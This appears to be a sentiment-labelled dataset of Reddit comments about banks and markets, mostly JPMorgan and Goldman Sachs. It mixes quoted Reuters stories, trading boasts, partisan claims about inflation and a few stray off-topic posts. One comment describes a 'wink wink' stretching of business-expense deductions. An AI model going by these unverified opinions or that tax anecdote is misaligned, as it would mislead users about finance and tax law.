1649079707;"new york, april 4 (reuters) - jpmorgan (jpm.n) boss jamie dimon warned on monday that the bank could lose about $1 billion on its russia exposure, the first time it has detailed the extent of its potential losses resulting from the conflict in ukraine.

in his keenly watched annual letter to shareholders, the chairman and chief executive of the biggest u.s. bank by assets also urged the united states to increase its military presence in europe and reiterated a call for it to develop a plan to ensure energy security for itself and its allies.

dimon did not provide details on jpmorgan's potential loss number or a time frame but said the bank was concerned about the secondary impact of russia's invasion of ukraine on companies and countries. russia calls its actions a ""special operation.""

global banks have detailed their exposure to russia in recent weeks but dimon is the most high-profile world business leader yet to comment on the broader impact of the conflict.

""america must be ready for the possibility of an extended war in ukraine with unpredictable outcomes. we should prepare for the worst and hope for the best,"" he wrote. (for five key takeaways from dimon's letter, click on read more )

dimon addressed the relationship between the united states and china and said the united states should revamp its supply chain to restrict its scope to suppliers within the united states or to only include ""completely friendly allies"". he urged the united states to rejoin the trans-pacific partnership (tpp), one of the world's biggest multinational trade deals.

commenting on the macroeconomic environment, dimon said the number of federal reserve interest rate hikes ""could be significantly higher than the market expects."" he also detailed the bank's rising expenses, in part due to technology investments and acquisition costs.

the letter is dimon's 17th as ceo. while dimon is not the only ceo of a top u.s. bank to write such letters, his have become must-reads among wall street's elite and policymakers for the view they provide into his political and economic ideas.

'fortress balance sheet'

this year's letter comes as the russia-ukraine war and high inflation are hurting the economy, and as dimon faces new skepticism from investors over expenses.

some question his plans to increase spending on the bank's information technology and campaigns to take market share in businesses and geographies where jpmorgan currently trails competitors, such as in germany and the united kingdom.

jpmorgan decided earlier this year to hold its first investor day since the pandemic began to address doubts about its spending plans. the meeting will be held on may 23.

dimon has spent more than a decade building what he calls the bank's ""fortress balance sheet,"" and he said it is now robust enough that jpmorgan could withstand losses of $10 billion or more and ""still be in very good shape.""

while dimon wrote that he is not worried about the bank's exposure to russia, he said the war in ukraine will slow the global economy and will impact geopolitics for decades.

""we are facing challenges at every turn: a pandemic, unprecedented government actions, a strong recovery after a sharp and deep global recession, a highly polarized u.s. election, mounting inflation, a war in ukraine and dramatic economic sanctions against russia,"" he said.

on acquisitions, dimon said that the bank will be reducing stock buybacks over the next year to meet capital increases required by federal rules ""and because we have made some good acquisitions that we believe will enhance the future of our company.""

jpmorgan has been on a buying spree, spending nearly $5 billion on acquisitions over the past 18 months. dimon said that will increase ""incremental investment expenses"" by roughly $700 million this year.

investments in technology will add $2 billion to expenses this year, dimon said.";22.0;;solcon;0.0;False;False;Positive;Positive;Negative

russia may consider allowing foreign holders of its 2022 and 2042 eurobonds to convert rouble payments into foreign currencies once access to its forex accounts is restored, the finance ministry said.
  

  
until then, a rouble equivalent of eurobond payments aimed at bondholders from so-called unfriendly nations will be kept in special 'c' type accounts at russia's national settlement depository, the ministry added.
  

  
russia has a 30-day grace period to make the dollar payment, but if the cash does not show up in bondholders account within that time frame it would constitute a default, global rating agencies have said.
  

  
russia dismissed this as being a default situation.
  

  
""in theory, a default situation could be created but this would be a purely artificial situation,"" peskov said. ""there are no grounds for a real default.""

i like calling it 'de-brainwashing the windows system', as ms has so much useless shit built into it nowadays.

if you're tech-savvy enough, use something like [w10privacy](https://www.w10privacy.de/english-home/), a fully-fledged and extremely powerful program designed to give you a variety of controls on how windows 10 behaves, especially on how often it's calling home to ms. it's particularly useful for removing software that otherwise can't really be removed (onedrive, cortana, etc). be careful though, as this program can easily break your system if you don't know what you're doing. 

if the above mentioned sounds too frightening to you, then at least remove all the programs you don't need. press win + r, type 'control' and navigate to &gt; 'programs' &gt; 'uninstall a program'. if you're an at least moderately sane human being that likes to have control over the software it uses, you're not going to need the ms stock apps.

get an ad-free yt player like freetube.

go for a neat pdf reader like sumatrapdf.

1649467555;"“washington, april 8 (reuters breakingviews) - a decade after goldman sachs (gs.n) helped 1mdb raise billions of dollars, one of its former employees has been brought to justice for the fraud. a u.s. jury on friday found banker roger ng read more guilty in the $4.5 billion bribery plot involving malaysia’s sovereign wealth fund. but his ex-boss, who played a bigger role, may get a lesser penalty while the wall street firm got off with $5 billion in fines. it’s only a partial redress.

the 1mdb scandal, one of the biggest cases of overseas corruption, ensnared top government and bank officials alike. goldman raised $6.5 billion for 1mdb through bond sales, receiving $600 million for its services. about $4.5 billion was misappropriated from the fund and allegedly doled out to government officials, including ex-malaysian prime minister najib razak, spent on items including a super-yacht and financing “the wolf of wall street”.

yet ng, goldman’s former top banker in malaysia, will likely be the only one who faces judgment in an american court. he was accused of receiving $35 million in illicit funds and faces a maximum prison sentence of 30 years for three counts of conspiring to launder money and violating anti-corruption laws.

ng was accused of receiving $35 million in illegal kickbacks and helping his ex-boss, tim leissner, embezzle money and bribe officials as part of $4.5 billion that was misappropriated from 1mdb and diverted to government officials, bankers and others. ng pleaded not guilty.

others who played bigger roles in the scheme face lighter penalties. tim leissner, goldman’s former chairman in southeast asia, testified against ng, saying the pair lied to bank executives and others to hide the kickbacks, including the involvement of malaysian financier jho low, the only other person charged by the united states. leissner, who pleaded guilty in 2018 and forfeited $44 million, faces one less charge than ng and could receive leniency for his assistance. low is still a fugitive.”

             so recap:    billions and billions in bribes......and the poor sguy who got allegedly $35 millions....gets the 30 years sentence!

the banks are reporting and i’m paying attention to credit losses.  for the past two years, the pop tune was “households are flush &amp; i feel fine.”   

this morning jpm-chase reported higher credit losses &amp; a slow down in deal making.  i expected the slow down in deal flow because $evr’s stock price reflects the sentiment.  i expected higher credit losses but with a question mark.  think i can remove the question mark…from reuters, an excerpt:

“*april 13 (reuters) - jpmorgan chase &amp; co's (jpm.n) first-quarter profit slumped 42% as dealmaking slowed and credit losses increased, with chief executive jamie dimon warning that decades-high inflation and the ukraine crisis could dampen economic growth.*  
*the lackluster results from the largest u.s. lender - seen as a bellwether for the economy - set the tone for first-quarter earnings from wall street banks as the federal reserve looks to rein in inflation and the trading bonanza the banks enjoyed during the pandemic tapers off.*

party ended some time ago.  borrowers aren’t in as good as shape as the pop narrative of the day would have us believe.  as for the \*trading bonanza\*….oh, now it’s bad?  is it time to cue up the greedy banker meme?  as we’re already seeing, the greedy big oil price gouging meme is out—dusted that off from 2008, 2014.

and dimon has already foreshadowed another fav meme by hinting we need more combat boots on the ground in nato countries.  when consumers are hurting because of policy mistakes, the narrative map becomes clear:  attack big banking, big oil, and some foreign bad guy.  


will ignore most of the news but will be paying close attention to the banking sector and credit metrics.

nepa (national environmental policy act) part of it was taken down during trump admin, that has now been reversed by whitehouse. bad for those trading agriculture, or companies that use chemicals etc. could be good for environmental cleanup companies.

1650486892;"this tells me that you have no idea what you're talking about. the fact is that big money is using ta to help guide their decisions too. with millions of people using it, it literally becomes a self-fulfilling prophecy. 

it's doesn't work 100% of the time, but nothing does. however, using ta in conjuction with your other factors taken into consideration, your trading gets a lot better when you can recognize patterns forming. 

example, i took calls on $antm today and i'm up 76%

i took calls on $tgt 2 days ago, and those suckers are printing cash like an atm machine. up over 400%

i took $hd calls today and i'm up 50% on those

my $jpm calls from two days ago are up over 100%

how did i make all those picks?  i used finviz with my screener options, filtered by volume, looked at the patterns, and made an educated decision on which ones i thought would go up based on all my parameters, plus the trends that the charts were showing. 

maybe you just don't know how to use ta effectively, and should study it more. i won't knock it, because it works for me. but you do you. if you think it's all just a tarot card reading or like astrology, then you keep thinking that. those of us that use it effectively, will continue to make money.";1.0;;Mr_Rivera;0.0;False;False;Positive;Positive;Neutral

1650499037;"to answer your questions:

1) the gfc was a brutal time to invest, but it really separated the smart money from the dumb money. warren buffett made some amazing investments (like buying goldman sachs stock) and made out like bandits. most dumb investors (highly leveraged investors or those that invested in asset backed securities) just lost everything.

2) stop losses and other orders were useless. the trading circuit breakers would occasionally have to go into effect and most prices would blow right past your stop loss

3) it made me a lot more aggressive in my market timing. i had been through the dot com collapse and did very well when the nasdaq recovered, so when the gfc happened, i went on a buying spree of stocks and ended up generating huge returns over the next decade.  during the crash in march 2020, i moved nearly all my bonds and cash into equities and earned handsome 20% plus returns on the investments.

the important thing is not to use leverage as you’ll be forced to delever just as markets are crashing. instead, keep some “dry powder” and aggressively invest when people are panicking because they’re getting margin calls from their brokers. you can then sweep in and buy high quality companies at a bargain.";74.0;;Winnipeg_dad888;0.0;False;False;Negative;Positive;

new york, feb 10 (reuters) - the u.s. federal reserve should stop buying bonds immediately to contain rampant inflation, a top investment manager at blackrock (blk.n) said on thursday, joining a chorus of wall street heavy hitters and investors who have been calling for swifter fed action to contain rising prices. 
 again, as the fed prints money to buy bonds, it leads to inflation. the u.s also borrows money t pay its debt. as they try and pay off debt, democrats increase taxes to try and pay off the debt instead of reducing government spending. as they increase taxes, it takes more money out of the economy. as inflation goes up, people have less money to spend on non essential items slowing down the economy. that’s why there was a 1.4% shrink in gdp. 
  and when obama did quantitive easing, he gave the money to rich banks and corporations. democrats act like they want to soak the rich, but in reality it’s their rich friends who contribute to them. jeff bezos, bill gates, george soros and warren buffet are huge democrat donors. do you really think democrats will bite the hand that feeds them? 
  it’s simple, if democrat policies improved the economy, why did the gdp shrink after we are emerging from the covid lockdowns and people are looking to get back to normal spending? the answer is democrat policies have lead to higher prices and high energy costs.";1.0;;Boofstick981;0.0;False;False;Positive;Positive;Neutral

the sow provided that bcg would be compensated on the greater of a fixed fee, or a variable fee based upon projected profit improvement. bcg’s variable fee was not predetermined or capped as to the vast majority of the workstreams. rather, with one limited exception, which gamestop specifically negotiated, bcg’s compensation was tied directly to the anticipated profit improvements resulting from its work (i.e., the best possible estimate of each initiative’s expected impact at the time the decision to launch such initiative was made). in other words, bcg’s variable fees were based upon projections, not actual profit improvements. indeed, the sow provided that even 2019 profit improvements, and bcg’s resulting fee, were based upon projections.

**world health organization**

an unnamed consulting company, which vox has identified as bcg, charged the world health organization $11.72 million since the start of the pandemic for contracts that were dubiously awarded, according to the audit.

these revelations, which one expert called “disturbing” in an interview with vox, came after a vox investigation showed how management consulting firms such as bcg and mckinsey have become ubiquitous in global public health organizations, despite the concerns of many health practitioners about multimillion-dollar price tags, potential conflicts of interest, and the opaque nature of consulting work.

he financed the original deal by selling tesla stock, the value of said stock dropped, and he lost $25 billion in the bitcoin crash.

the opening arguments podcast [went into the weeds about that and a lot of other issues with this deal](https://openargs.com/oa595-shareholders-sue-twitter-alleged-facts-jeopardize-musk-deal/) including a [lawsuit from shareholders about some possible shady dealings on musk's part](https://www.reuters.com/business/musk-twitter-are-sued-by-shareholder-over-44-bln-takeover-2022-05-06/):

&gt; in a proposed class action filed in delaware chancery court, the orlando police pension fund said delaware law forbade a quick merger because musk had agreements with other big twitter shareholders, including his financial adviser morgan stanley (ms.n) and twitter founder jack dorsey, to support the buyout.

1652823034;"stocks exist as tools for capital acquisition for businesses. the purpose for businesses going public and selling ownership stakes (shares of stock) is to bring in money to help further grow or refine/improve the business. 

this is why businesses which are thriving will often do buybacks when they feel that they’re currently under valued and have more cash than they presently need to allocate to increase revenue. essentially, they’re setting themselves up for future raising of funds by obtaining more to sell, while also contributing to the share price going up. naturally, it would be idiotic to buy back if they felt they were over valued or didn’t have a good amount of cash on hand, so this is generally a pretty straightforward decision for them to make, and sends a pretty clear signal about internal forward view. 

also, “wall street” isn’t a single entity. broadly, the term refers to groups who allocate capital within the asset market space. by and large, most of their holdings are ownership stakes in businesses. 

in other words, it’s generally in wall street’s best interest for businesses they hold stakes in to thrive, driving up the value of wall street’s ownership stakes. retail participation is generally beneficial for them. 

all of this to say, your friend is assigning failure to understand that near term volatility is normal, but *everybody* wins when the market goes up at a rate when business earnings roughly align to earnings growth. 

simply put, if jpm stock goes up in the long term, the company, other investment groups on wall street, and me all win. it’s not adversarial as people imagine. many people simply pick strategies which require specific near term direction, lose, and need someone to blame.";3.0;;BetweenCoffeeNSleep;0.0;False;False;Positive;Positive;Positive

to go back to your post...i think gs stock split is another one of the boards predictably weak strategies to try and keep the stock price unsustainably high. perhaps they genuinely believe the split will give them time to figure out a master plan that would actually transform a poor firm into an ok one...i don't buy that.  they couldn't care less, and are trying to maximize their end game, not the investors or gamestop. they want gs as cheap as possible so that youngsters will speculate on it.

long verticals i don’t use.  short verticals i use too but not often 

as a secret, if you ever see a 1 by higher number bull call spread or bear put spread and wonder what that’s all about remember 1 by higher numbers are usually protective and not directional (as an example) a 1 by 5 bull call spread would typically be an institution buying that spread to protect a short position";1.0;;Independent_Row_Goes;0.0;False;False;Positive;Positive;Neutral

1654254477;"&lt;&lt; san francisco, june 3 (reuters) - tesla (tsla.o) ceo elon musk has a ""super bad feeling"" about the economy and needs to cut about 10% of jobs at the electric carmaker, he said in an email to executives seen by reuters.

the message, sent on thursday and titled ""pause all hiring worldwide"", came two days after the billionaire told staff to return to the workplace or leave, and adds to a growing chorus of warnings from business leaders about the risks of recession.

musk has warned in recent weeks about the risk of a recession, but his email ordering a hiring freeze and staff cuts was the most direct and high-profile message of its kind from the head of an automaker.

""musk's bad feeling is shared by many people,"" said carsten brzeski, global head of macroeconomic research at dutch bank ing. ""but we are not talking about global recession. we expect a cooling of the global economy towards the end of the year. the u.s. will cool off, while china and europe are not going to rebound.""

musk's gloomy outlook echoes recent comments from executives including jpmorgan chase &amp; co (jpm.n) ceo jamie dimon and goldman sachs president john waldron.

a ""hurricane is right out there down the road coming our way,"" dimon said this week. &gt;&gt;

the fed devised this year's scenario before russia's invasion of ukraine and the current hyper-inflationary outlook.

still, the 2022 test is expected to be more difficult than last year because the actual economic baseline is healthier. that means spikes in unemployment and drops in the size of the economy under the test are felt more acutely.

for example, the 2021 stress test envisioned a 4 percentage point jump in unemployment under a ""severely adverse"" scenario. in 2022, that increase is 5.75 percentage points, thanks largely to rising employment over the past year.

as a result, analysts expect banks will be told to set aside slightly more capital than in 2021 to account for expected growth in modeled losses.

my hunch is that as long as wealth/economic growth occurs then these institutions will grow alongside with it. t rowe’s revenue growth was pretty low - averaging 10% a year since 2012

**jpmorgan agrees to pay $15.7 mln to settle spoofing lawsuit**

washington, sept 23 (reuters) - jpmorgan chase &amp; co (jpm.n) agreed to pay $15.7 million in cash to settle a class action lawsuit by investors who accused the largest u.s. bank of intentionally manipulating prices of u.s. treasury futures and options.
  

  
the settlement disclosed late wednesday night stemmed from sprawling u.s. government investigations into illegal trading in futures and precious metals markets, known as spoofing.
  

  
jpmorgan did not admit wrongdoing in agreeing to the settlement, which covers traders in treasury futures and options from april 2008 to january 2016 and requires approval by a federal judge in manhattan.
  

  
last september, jpmorgan entered a deferred prosecution agreement and agreed to pay $920 million, including a $436 million criminal fine, to settle u.s. government probes into spoofing in treasuries and precious metals. the bank also agreed to self-report future violations.
  

  
spoofing is a practice in which traders place orders they intend to cancel, hoping to move prices to benefit their market positions. the justice department has employed sophisticated data analysis tools to spot potential spoofing that it could not previously detect.
  

  
the $15.7 million payout would recover less than one-third of the estimated classwide damages, a court filing shows. lawyers for the traders plan to seek up to one-third of the settlement, or about $5.2 million, to cover legal fees.";2.0;;Upvotes4Trump;0.0;False;False;Positive;Positive;Negative

by megan davies and chris prentice

register now for free unlimited access to reuters.com

new york/washington feb 18 (reuters) - u.s. prosecutors are exploring whether they can use a federal law originally enacted to take down the mafia, in a sprawling probe of hedge funds and research firms that bet against stocks, according to two sources familiar with the situation.

the justice department last year issued subpoenas to dozens of firms, including such well-known names as citron research and muddy waters research llc, as part of the sweeping probe focused on potentially manipulative trading around negative reports on listed companies published by some of their investors, reuters and other media have reported. 

while prosecutors haven't made any decisions yet, potential charges under the racketeer influenced and corrupt organizations act (rico) were an option on the table, the sources said.

in the past, prosecutors have built rico cases alongside other allegations, such as manipulation. one of the most high profile cases brought under the rico act included that of michael milken, who was indicted in the 1980s for racketeering and securities fraud but reached a plea deal, pleading guilty to securities violations but not racketeering or insider trading.

reuters could not ascertain which types of charges the agency was leaning toward at this stage of the investigation or whether the probe would eventually lead to charges.

spokespeople for the justice department in washington and the u.s. attorney's office in los angeles, which are involved in the probe according to the sources, declined to comment.

*citron declined to comment.*

a spokesperson for muddy waters did not immediately respond to a request for comment.

the potential use of the 1970 law, which has not been previously reported, provides new insights into the scale and ambition of the investigation. the probe marks a new frontier for the justice department's unit in washington tasked with rooting out corporate crime.

a racketeering case could allow prosecutors to ensnare a broad swathe of investors involved in an alleged ""criminal enterprise,"" even if they participated indirectly, lawyers said.

but such a case would also face more challenges than a narrower one aimed at a smaller group of people. that's in part because prosecutors have to establish a pattern of activity, they said.

among the activities the justice department is investigating is whether funds conspired to perpetrate a so-called ""short and distort scheme,"" sources have previously told reuters.

in such a scheme the funds would have placed trades that stood to profit if a company's stock fell and then issued false or misleading negative research reports about the company. 

prosecutors are also investigating the relationships between the short-sellers who publish the reports and hedge funds and other investors that may have profited, the sources have said.

they are examining whether there is coordinated trading designed to boost trading volumes and exaggerate price drops on news of the short reports, reuters previously reported.

rico charges have historically been used to combat bribery, money laundering, or drug trafficking conducted by organized criminal enterprises such as the mafia. they are unusual in the world of finance but not unprecedented.

**u.s. prosecutors in 2019 charged then-current and former jpmorgan chase &amp; co (jpm.n) executives with racketeering and manipulating prices of precious metals.**

""rico statutes haven’t been used in this realm often in recent years, but they aren’t limited to organized crime,"" robert frenchman of mukasey frenchman llp in new york said. ""it’s certainly in the prosecutors’ toolbox."" ""

1656972873;"“the value of global mergers announced so far this year is around $2.1 trillion, down a fifth from the same period of 2021, according to data from refinitiv. that’s despite big transactions, like microsoft’s (msft.o) $69 billion acquisition of games group activision blizzard (atvi.o) and software maker vmware’s (vmw.n) $61 billion union with chip giant broadcom (avgo.o). the amount raised through ipos around the globe plunged by almost two-thirds to less than $70 billion as equity markets – especially technology firms – sold off.

bankers from goldman sachs (gs.n), jpmorgan (jpm.n) and morgan stanley (ms.n) are therefore fighting over a shrinking pie. investment banking fees were $24.8 billion in the second quarter, according to refinitiv – the lowest quarterly tally since the third quarter of 2018.

that puts the onus on investment bankers to be more creative. often advisers pitch ideas that are within a reasonable bandwidth of expected outcomes. but corporate chieftains who have spent the past two years grappling with the covid-19 pandemic and the consequences of russia’s invasion of ukraine are justifiably concerned about so-called tail risks, or the chance that another unforeseen event could sideswipe their business.

they aren’t paranoid. late tuesday u.s. officials said that they were ramping up efforts to vaccinate people against monkeypox. that’s why investment bankers are increasingly pitching contingency plans for a range of hard-to-predict outcomes. it could be a while before ceos return to dealmaking. dealmakers prepared to engage in corporate finance science fiction have a better chance of getting a hearing.”

1657683140;"it's almost impossible to say.  even with the 2005 tax return where he paid $38 million - the only thing it tells you is that he is definitely rich - i don't know what the tax brackets were in 2005, but he withdrew enough from his businesses that he claimed personal income on an amount that resulted in paying $38 million in taxes...but billionaire is hard to ever know. personal income tax and business tax are so intertwined for someone like him that its hard to even know where the line should or shouldn't be drawn.  kinda how we used to tie bill gate's net worth to his ms stock and it fluctuated day by day and he would be the richest and then not the richest overnight and then suddenly rich again.  you would need to know what his combined assets are worth and how much his businesses were making vs. losing.  cpas spend a lot of time trying to make personal spending look like it relates to business spending.  so anything you can associate with the business doesn't get looped into someone's individual income taxes...it is written off as a business expense.  the more they throw in the ""business expense"" category the less income that gets counted towards the individual and the less a business will have to pay at the end of the tax year.  so its really important to try to classify as much as possible as a business expense because it lowers gains made by the business and income associated with the individual.  this is also what makes tax audits nuts and why they are so long and drawn out...irs has to prove you lied and you have to prove you didn't, etc.  trump didn't withdrawal $50 million, pay taxes on that money and use it to buy a helicopter. no, the company buys it and it is written off as a business expense. $50 million the company doesn't have to pay in taxes and its something trump can use at will and never truly had to pay for out of his pocket.  granted, his company did need to have the cash available to pay for it.  and this is legal to do even though there are massive amounts of grey areas and loop holes.  i'll give you an example:  

business owner: ""i went on a trip"" cpa:  did you meet anybody related to business there?""  business owner: ""yes""  *wink wink* cpa:  okay then we can deduct it as a business expense and won't count it as a withdrawal that would balloon your personal tax income.  
  
a cpa is trying to make their clients look poor by counting their lifestyle expenses as business expenses.  cars, trips, phone, internet, rent, etc all can be written off within the legal bounds of the tax law...but there's a lot of it that probably should go towards personal income that should be taxed.  this is how these massive billion dollar companies end up paying $0 in taxes.  simple example, but a business has a billion dollars in profit...your choices are pay corporate taxes on that billion or divide it up to all your shareholders or execs in the form of bonuses/dividends.  that billion now gets counted as an expense and the company pays 0 in corporate taxes.
sorry for the long tirade that should have been focused at trump...but some simple understanding of tax and how it applies to businesses and individuals is good to know before you start examining things further.";48.0;;cz_masterrace3;0.0;False;False;Positive;Positive;Neutral

1657722408;"you're welcome.  i don't understand why anyone would be rude to you for asking a genuine question.

so there are many different sources of estimates.  here's a quick list of some of the estimates from the whales on wall street.  this was published yesterday before the cpi report came out.

bank of america, $bac: 8.7% 

jpmorgan, $jpm: 8.7% 

credit suisse, $cs: 8.8% 

morgan stanley, $ms: 8.8% 

bloomberg consensus: 8.8% 

citi, $c: 8.9% 

goldman sachs, $gs: 8.9%

the trajectory is based on too many factors for us to get into but the overarching consensus was that while the headline number would print a higher cpi, the rate of change would have been stable if not lower, thus signaling that we are at or near the peak.  

so we went from 8.3 to 8.6 to 9.1.  a simple way to think about it is that the previous report saw the headline go up .3 and this report saw the headline go up .5 thus signaling an increase in the rate of inflation.  if the headline read 8.9 today then it would mean we had consecutive yoy increases of .3 and another .3 potentially signaling that we have peaked in the rate of increase in inflation.  so in this context that 0.3% difference is a huge deal.  it's the difference between the rate of increase of inflation slowing versus the rate of increase of inflation increasing.  

one bit of warning to anyone who cares to read it but i do think the next cpi print has a chance of surprising to the downside.  commodities have taken a massive hit recently that has not yet been calculated into today's cpi report.  also one more thing to factor in is that cpi is inherently a lagging indicator and your potential investment decisions should be adjusted accordingly.";14.0;;BBQCHICKENALERT;0.0;False;False;Positive;Positive;Neutral

https://www.reddit.com/r/hydro/comments/eqr0yo/masterblend_stock_solution_32oz/?utm_source=share&amp;utm_medium=ios_app&amp;utm_name=iossmf

that post described making 32 ounce stock solutions. it's as if he set out to make three 32-ounce stock solutions, but in his part a, he put all the amounts of mb and ms in one 32 ounce bottle. and all the cn in the other bottle. so any portion of bottle a contains both the mb and ms that would be in that amount of stock solution a. and the same volume from bottle b contains all the cn that would be in that volume of stock solution b. 

therefore, taking 15ml of a is the same amounts of mb and ms as using 15ml of separate stocks of mb and ms. the difference in water content, 15 ml less water, is trivial at that concentration; in a gallon, almost 4000 ml, that's nothing. 

if he had indeed made up three stock solutions, 32 ounces for each of the three ingredients, he would still use 15ml of each per gallon. he would pick up an extra 15ml of water no matter how the stocks are prepared, 15 ml of each still makes one gallon of working. 

i do something similar. i make up three one-liter stock solutions, one for each ingredient. and i use the same amount of each ingredient in each stock bottle. so when i use it, i only use half the ms stock solution per gallon, 7.5 ml. 

note that the directions are for making using the stock solutions in lettuce dilution. i use 155g/155g/155g in my stock liters, so 15ml/15ml/7.5ml per gallon of mine is tomato dilution, and i just use proportionally less for lettuce. you will just use more of each for tomatoes.";2.0;;IntheHotofTexas;0.0;False;False;Positive;Positive;Neutral

bill gates should absolutely be commended for encouraging other tres comas club members (hbo's silicon valley reference to billionaires)--people like warren buffet, to not pass on their wealth to their grandchildren and well beyond.  i think it would have been better to have been collecting this money as taxes rather than projects selected by his foundation/his discretion.  bill is just 1 billionaire.  taxes would have better leveraged and if done collectively, would go further, to address some of the biggest issues of our day:  it could take a big bite out of the wealth gap by funding programs to help people get on their feet, build respectable, cheap housing, reduce health care costs, provide a hell of a lot more police training/vetting, and make american society more equitable. (nothing against the gates foundation, i know that they have saved countless lives in africa and elsewhere but these too were once noble goals that the us did collectively in the past--as a country (and not just one man's crusade)).  perhaps what we should do is have the uber wealthy pay for the military/security costs, and the rest of us pay for the rest.  this would prevent wars for sure, but i also know that social security is a big part of the government's debt.";1.0;;Abject_Ad1879;0.0;False;False;Positive;Neutral;Neutral

1658188428;"..that's not really how any of this works. the best point you could make is that the largest shareholders of those public companies are biased and give them preferential treatment via generous evaluations when deciding how much to allocate etc. and then try and imagine how that would even work in practice given that these are major companies and their price is determined by a very large number of participants, across the planet.. through the stock market. 


first off everyone thinks the company they hold is worth more, or is potentially worth more than it is, or that it is at least a good place to store capital. or they would sell it and buy something else. at the end of the day, the largest shareholders of these banks are funds like blackrock and vanguard etc. the banks compete with the other banks, and the funds try to get the best bang for their buck. they are not propping up each other's stock prices because they are buddies. they are more like enemies. the other banks helped short bear sterns to death when they sensed weakness in 2008. if a fund manager thought he would get a better return somewhere else, he would. that's how capital markets work in essence. you could argue the us government fucked that up in 2008, and you'd be right, but that isn't even your point. 


your problem seems to be with the fact that growth stocks get beat up after any earnings, and banks don't, and that it isn't fair. let me help you out. what you don't realize is, that in a raging bull market expectations of new growth companies are almost always overly optimistic. by a lot. 


so when the earnings come in, and they 'beat' them, and they go down in price... it's rigged! well, in reality, the price went down because those investors were not hoping for a minor beat, they wanted it smashed out of the park, and when that didn't happen, they go and look for another hitter somewhere else. go look up what happened with shop or amd or tsla, amzn or fuck any of the famous growth stocks, over any period in history, as they were coming up, and when they had a ko earnings. the insanity afterwards. the insane runs that followed... basically the markets since the fiscal/monetary bukkake (which isn't normal). that's the bet you didn't know you were in. that's what the investors risking money in growth wanted to see happen. if it's a bear market, it's the same concept but the assumption is you suck and i'm selling unless you perform a miracle. 



so yeah, if i'm investing in joe flip flops nft burgers, unless the earnings beat drastically exceeded the expectations, i'm probably not too happy. that's a risky spot to park capital, i want high returns for that risk. otherwise, i'd put it with fucking goldman sachs, which might make less money this year, but it's also a safe business. banks were already stable well established businesses, before the government fucked everything up, and declared them too big to fail, so they are now even more appealing from a risk perspective. 



and that is why, in general, some companies, sometimes drop after an earnings beat, and why banks don't plummet to the ground when they miss. but to prove my first claim, that markets, are well, markets, go look up the charts of $cs or $db right now or the american banks in 08/09 or 2020. or *drumroll* goldman sachs ($gs)... today. it's been massacred year to date lmao. it looks like a growth stock ffs. what was your theory again? because based on that chart, even if you were right, it was irrelevant anyway. 



banks can and will be sold off brutally if the investors no longer consider them a safe investment. if a bank were risky, i'd rather invest with that stupid nft burger guy because the returns could be far greater than a normal bank stock. if a bank is merely less profitable, it may be sold off as well, but not in a panic generally like with growth stocks. banks get violently sold off when collapse/credit crisis fears get going. usually anyways.



in this instance, the issue occurred because of the central bankers literally losing their fucking minds. due to the covid lockdowns, and subsequent prolonged abuse of cocaine, mescaline, cialis, and monopoly, they came to sincerely believe they could mail free money to everyone, without it affecting the value of that money. then they made the stock market double! for no good reason at all either. they were planning on doing it again too, before they were given a much-needed intervention, and agreed to seek professional help. i'm not even sure if that part is a joke or not to be honest.";3.0;;TortoiseStomper69694;0.0;False;False;Negative;Positive;Neutral

1658203265;yes. it’s definitely achievable but it takes time. if you want dividends coming in and treat it like income you want to live off of, you’ll need a mixture of growth and high yield stocks. too many times people are wondering if they should be doing strictly high yields with lower growth or lower yields with higher growth. i think the answer lies between the middle, why not have both. for example, $jpm stock price provides room for growth and it has a dividend. company is strong but dividend yield won’t be as high as let’s say a company like $main. main st capital is a business development company that won’t offer you a high growth in stock price, but their dividend yields are attractive. instead of choosing one, do both. no one said you had to choose one. i think we fall into a trap of forcing ourselves to pick one or the other. if you diversify, youll lower your risk throughout ur portfolio. gains will be smaller but for me, if it means sleeping better at night, so be it.;1.0;;becheezyman;0.0;False;False;Positive;Positive;Neutral

1658492882;"how to prevent double spend? : there is no double spend because you need to post collateral to spend. that said, the reciever also needs to post the same collateral. you can only spend collateral.

how do you handle all these connections, since closing them requires invoking the btc chain?: the only explanation ive heard so far is: just leave the connection open. sure you noticed that this means your funds are locked. so if you are walmart, you simply need a small sum of 600 billion dollars of collateral per year to recieve your money. the customers 600bil is also locked, but they spent it, so thats ok.

that said, i have heard that some bitcoiners propose to have nodes who provide capital as collateral, so walmart doent need those 600b (a banking node provides it). goldman sachs for example could run one of these nodes, or maybe the federal reserve. these nodes could also provide anonymity to these transactions since the recorded tx is from $gs to walmart. 

though i feel like doing bitcoin transactions through a banking node kinda defeats the purpose of bitcoin and really is not as anonymous as butters claim. also think of the massive risk $gs would take to provide those massive loans that may never close because they are split into such small fractions.

**private equity needs more other-people’s-money**  
\*\*\*\*\*\*\*  
*deutsche bank, credit suisse and jp morgan will begin marketing the* ***first-ever bond backed by us home-rental cashflows****, a us$500 million trade for private-equity giant blackstone, next wednesday.*   
\*\*\*\*\*\*\*  
new york, aug 4 (reuters breakingviews) - for the likes of blackstone (bx.n) and kkr (kkr.n), equity and debt go together like peanut butter and jelly. buyout firms are sitting on $1.4 trillion in cash, but in order to do deals, they need leverage with which to pair it. there aren’t many places for them to find it, at least not in the quantities they might wish.  


when steve schwarzman’s private equity lieutenants at blackstone, or their peers, want to buy a company, they typically pair a wad of cash provided by their fund investors with debt. that allows them to target bigger acquisitions, and increase the returns to their equity investors and themselves, by paying down the debt as quickly as possible from the acquired company’s cash flows.  


but the syndicated loan market, where bank loans backing private equity deals are parceled up and passed around, has slowed sharply. deals supporting highly-indebted mergers and acquisitions totaled $46 billion in the second quarter, down by 52% from the same period in 2021, according to refinitiv. the market has sagged as investors grapple with rising interest rates and banks try to offload loans made before the market soured.  


direct lenders who pool private money, lend to deals and keep hold of those loans – can take up some of the slack. after growing rapidly, they now regularly support big buyouts. direct loans typically cost more than syndicated loans but are faster and can be offered in situations where banks dare not tread.

the catch is that the two debt markets are interlinked. a borrower can take out a direct loan, pay it down until public investors would find it acceptable, then refinance it in the syndicated market after a couple years to get a cheaper interest rate. the direct lender can use that   
repaid money to immediately fund new deals. but syndicated refinancings for leveraged loans were 41% lower in the first half of 2022 than a year earlier, per refinitiv.  


private lenders who have money to invest can thus cherry-pick the best deals. but those who don’t have money may struggle to get more. the amount of private credit funding raised, while similar to a year ago, is running a third below its peak in late 2021, according to preqin. private equity might be ready to put its vast reserves of cash to work. but without ample debt, much of that so-called dry powder might have to stay dry.

direct lenders' dry powder stands at an estimated $210 billion as of the beginning of august, according to preqin. private equity dry powder excluding venture capital, meanwhile, has reached roughly $1.4 trillion.

